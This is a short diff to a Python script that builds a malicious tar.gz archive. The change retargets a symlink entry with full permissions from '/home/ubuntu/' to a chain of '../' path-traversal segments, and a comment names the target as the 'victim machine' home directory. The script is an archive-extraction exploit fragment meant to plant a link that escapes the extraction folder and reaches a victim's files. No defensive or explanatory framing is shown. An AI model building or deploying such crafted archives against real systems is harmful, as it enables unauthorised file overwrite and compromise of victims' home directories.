@@ -30,7 +30,7 @@ def build_tar_gz_1(tar_gz_file):
     obj1.name = "{}".format(RANDOM_DIR_NAME)  # Set the name of the soft link
     obj1.mode = 0o777  # Set permissions
     obj1.type = tarfile.SYMTYPE  # Set as a soft link
-    obj1.linkname = "/home/ubuntu/"  # Replace with the actual victim machine home directory path
+    obj1.linkname = "../../../../../../../home/ubuntu/"  # Replace with the actual victim machine home directory path
 
     with tarfile.open(tar_gz_file, "w:gz") as tar:
         tar.addfile(obj1)  # Add soft link to tar.gz
